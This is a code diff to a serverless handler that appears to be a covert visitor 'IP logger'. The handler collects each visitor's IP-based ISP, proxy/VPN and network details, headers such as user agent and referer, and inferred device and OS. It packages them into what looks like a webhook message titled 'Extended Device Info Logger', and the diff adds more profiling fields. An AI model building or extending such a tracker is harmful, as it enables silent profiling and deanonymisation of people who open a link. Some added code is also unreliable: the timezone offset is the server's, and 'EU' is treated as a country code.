@@ -50,12 +50,14 @@ export default async function handler(req, res) {
             return;
         }
 
+        // Gather additional information from request headers
         const userAgent = req.headers['user-agent'] || 'Unknown';
         const acceptLanguage = req.headers['accept-language'] || 'Unknown';
         const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
         const doNotTrack = req.headers['dnt'] === '1' ? 'Yes' : 'No';
         const referer = req.headers['referer'] || 'No referer';
         
+        // Detect device type, OS, and browser rendering engine
         const deviceType = detectDeviceType(userAgent);
         const browserEngine = /Chrome|Chromium|Edg/.test(userAgent) ? 'Blink' :
                               /Safari/.test(userAgent) ? 'WebKit' :
@@ -65,6 +67,14 @@ export default async function handler(req, res) {
                    /Mac/.test(userAgent) ? 'macOS' :
                    /Android/.test(userAgent) ? 'Android' :
                    /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
+
+        // Additional inferred data
+        const connectionType = ipDetails.isp?.includes('Fiber') ? 'Fiber' :
+                               ipDetails.isp?.includes('DSL') ? 'DSL' :
+                               ipDetails.isp?.includes('Cable') ? 'Cable' : 'Unknown';
+        
+        // Time zone offset in hours
+        const timezoneOffset = new Date().getTimezoneOffset() / -60;
 
         const message = {
             username: "Extended Device Info Logger",
@@ -96,7 +106,10 @@ export default async function handler(req, res) {
                         { name: "Referer", value: `\`${referer}\``, inline: false },
                         { name: "Network Type", value: `\`${ipDetails.mobile ? "Mobile" : "Broadband"}\``, inline: true },
                         { name: "Using Proxy/VPN", value: `\`${ipDetails.proxy ? "Yes" : "No"}\``, inline: true },
-                        { name: "Hosting", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true }
+                        { name: "Hosting", value: `\`${ipDetails.hosting ? "Yes" : "No"}\``, inline: true },
+                        { name: "Connection Type", value: `\`${connectionType}\``, inline: true },
+                        { name: "Local Time Offset", value: `\`${timezoneOffset} hours\``, inline: true },
+                        { name: "Currency (Approx)", value: `\`${ipDetails.countryCode === 'US' ? 'USD' : ipDetails.countryCode === 'EU' ? 'EUR' : 'Unknown'}\``, inline: true },
                     ]
                 }
             ]
